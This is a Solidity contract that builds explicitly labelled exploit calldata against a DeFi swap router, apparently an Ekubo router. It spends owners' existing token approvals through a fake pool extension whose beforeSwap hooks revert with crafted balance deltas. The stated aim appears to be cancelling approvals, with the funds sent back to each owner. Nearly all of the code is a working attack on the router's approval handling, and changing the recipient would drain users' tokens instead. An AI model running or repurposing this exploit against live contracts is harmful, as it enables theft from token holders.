// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {PoolKey} from "ekubo/types/poolKey.sol";
import {SwapParameters} from "ekubo/types/swapParameters.sol";
import {createPoolBalanceUpdate, PoolBalanceUpdate} from "ekubo/types/poolBalanceUpdate.sol";

contract VulnerableApprovalCanceller {
    struct RouterApprovals {
        address router;
        Approval[] approvals;
    }

    struct Approval {
        address token;
        address owner;
        uint128 amount;
    }

    function cancelApprovals(RouterApprovals[] calldata routerApprovalsArr) external {
        bytes32 poolConfig = bytes32(uint256(uint160(address(this))) << 96);

        for (uint256 i = 0; i < routerApprovalsArr.length; i++) {
            RouterApprovals calldata routerApprovals = routerApprovalsArr[i];

            address router = routerApprovals.router;
            Approval[] calldata approvals = routerApprovals.approvals;

            for (uint256 j = 0; j < approvals.length; j++) {
                Approval calldata approval = approvals[j];

                bytes memory exploitCalldata = abi.encodePacked(
                    hex"00", // withRecipient
                    hex"10", // specifiedAmountBytes
                    hex"00", // calculatedAmountThresholdBytes
                    hex"ff", // specifiedTokenInfo
                    hex"ff", // calculatedTokenInfo
                    hex"00", // additionalMultiHopSwaps
                    hex"00", // withIntegrationFee
                    hex"00", // withSqrtRatioLimit | isExactOut
                    approval.token, // specifiedTokenAddress
                    approval.token, // calculatedTokenAddress
                    approval.amount, // specifiedAmount
                    hex"00", // additionalHops
                    hex"04", // extensionInfo
                    hex"00", // skipAhead
                    poolConfig,
                    approval.owner,
                    bytes12(0),
                    approval.owner
                );

                (bool success, bytes memory returndata) = router.call(exploitCalldata);
                if (!success) {
                    assembly ("memory-safe") {
                        revert(add(returndata, 32), mload(returndata))
                    }
                }
            }
        }


    }

    // V2
    function beforeSwap(address, PoolKey calldata, int128 amount, bool isToken1, uint96, uint256)
        external pure
    {
        (int128 delta0, int128 delta1) = isToken1 ? (-amount, amount): (amount, -amount);

        assembly ("memory-safe") {
            mstore(0x00, delta0)
            mstore(0x20, delta1)
            revert(0x00, 0x40)
        }
    }

    // V3
    function beforeSwap(bytes32, PoolKey calldata, SwapParameters params)
        external pure
    {
        int128 amount = params.amount();
        bool isToken1 = params.isToken1();

        (int128 delta0, int128 delta1) = isToken1 ? (-amount, amount): (amount, -amount);
        PoolBalanceUpdate deltas = createPoolBalanceUpdate(delta0, delta1);

        assembly ("memory-safe") {
            mstore(0x00, deltas)
            revert(0x00, 0x20)
        }
    }
}
